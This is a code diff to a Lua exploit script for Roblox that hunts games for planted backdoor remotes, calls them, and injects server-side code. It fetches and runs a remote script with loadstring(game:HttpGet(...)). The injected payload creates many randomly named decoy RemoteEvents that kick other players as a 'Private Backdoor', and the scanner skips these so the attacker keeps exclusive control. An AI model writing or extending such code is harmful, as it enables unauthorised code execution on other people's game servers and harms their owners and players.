@@ -107,7 +107,13 @@ local notify = loadstring(game:HttpGet("https://pastefy.app/JNTqAzrn/raw", true)
 	local bg = 1
 	local remoteEvent, remoteFunction
 	local scanTime = 0
-	
+
+    local function genString()
+       local Words = {"PÀtRîk","sKîd4LïFë","pÀtRïkk","ØmáGAâ","SkïD","sKĪBiDì","SìgMå","pRīVAtĒ","BaÇkdÖør","TøKËn","kêY","whÅt","bÀhlïL","RïZz","eMbégË","sÂwiT","PrÃBõwø","JÓKøwī","mÊgAwåTī","SúPêr","sHïT"}
+       local String = Words[math.random(1, #Words)] .. "_" .. Words[math.random(1, #Words)] .. "_" .. tostring(os.clock()):gsub("%.", "")
+       return String
+    end
+    local secureName = "!!!" .. genString()
 	local function isLikelyBackdoorRemote(remote)
 		local name = remote.Name
 		local parent = remote.Parent
@@ -149,6 +155,9 @@ local notify = loadstring(game:HttpGet("https://pastefy.app/JNTqAzrn/raw", true)
         if remote:GetAttribute("__VX_ROLE") == "EVENT" then
                 return false
         end
+        if name == secureName then
+                return false
+        end
 		if parent.Parent.Name=='HDAdminHDClient' and remote.Parent.Name=='Signals' then
 			return false
 		end
@@ -169,12 +178,6 @@ local notify = loadstring(game:HttpGet("https://pastefy.app/JNTqAzrn/raw", true)
 	local function testRemote(remote, isFunction)
 	if foundExploit then return false end
 	if not isLikelyBackdoorRemote(remote) then return false end
-
-    local function genString()
-       local Words = {"PÀtRîk","sKîd4LïFë","pÀtRïkk","ØmáGAâ","SkïD","sKĪBiDì","SìgMå","pRīVAtĒ","BaÇkdÖør","TøKËn","kêY","whÅt","bÀhlïL","RïZz","eMbégË","sÂwiT","PrÃBõwø","JÓKøwī","GäΠJâr","mÊgAwåTī","SúPêr","sHïT"}
-       local String = Words[math.random(1, #Words)] .. "_" .. Words[math.random(1, #Words)] .. "_" .. tostring(os.clock()):gsub("%.", "")
-       return String
-    end
 
 	local modelName = genString()
     local tokenName = genString()
@@ -3321,20 +3324,13 @@ local services = {
 for _, svc in ipairs(services) do
   for r = 1, 40 do 
     local s = Instance.new("RemoteEvent")
-    s.Name = "!!!patrik.bd_cssr6-O1"
+    s.Name = "]] .. secureName .. [["
     s.OnServerEvent:Connect(function(player)
         player:Kick("Backdoor has been secured by Patrikk - Private Backdoor.")
     end)
     s.Parent = svc
     task.wait()
   end
-
-    local remote = Instance.new("RemoteEvent", game:GetService("ReplicatedStorage"))
-    remote.Name = "!!!patrik.bd_cssr6-O1"
-
-    remote.OnServerEvent:Connect(function(player)
-        player:Kick("Backdoor has been secured by Patrikk - Private Backdoor.")
-    end)
 end]])
 
 fireRemoteEvent([[
